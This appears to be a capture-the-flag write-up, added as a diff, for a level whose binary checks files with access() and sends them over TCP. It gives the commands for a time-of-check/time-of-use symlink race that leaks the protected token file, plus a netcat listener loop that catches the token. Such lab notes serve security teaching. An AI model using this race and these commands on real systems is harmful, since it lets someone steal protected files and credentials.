@@ -1,0 +1,35 @@
+strings level10
+nm -u level10
+
+
+We can see that the program use access and tcp/ip to host:6969
+
+./level10 file host
+
+access can result in race conditions
+
+http://repository.root-me.org/Programmation/C%20-%20C++/EN%20-%20Secure%20Coding%20in%20C%20and%20C++%20Race%20Conditions.pdf
+
+man access : -> 
+
+Warning: Using access() to check if a user is authorized to, for  exam-
+       ple, open a file before actually doing so using open(2) creates a secu-
+       rity hole, because the user  might  exploit  the  short  time  interval
+       between  checking and opening the file to manipulate it.  For this rea-
+       son, the use of this system call should be avoided.
+
+
+we create the file /tmp/sym.py which spam to create an symlink from token to /tmp/dummy and do it also with an random file so the binary can bypass access
+
+then we can :
+touch /tmp/abc && python /tmp/sym.py & while true; do ./level10 /tmp/dummy 127.0.0.1; done
+
+
+so what happens is after the access condition there is an short time when the dummyfile which pass the access condition is replaced by link to token
+
+connect to ssh with another shell
+
+while true; do nc -l 6969; done
+
+
+
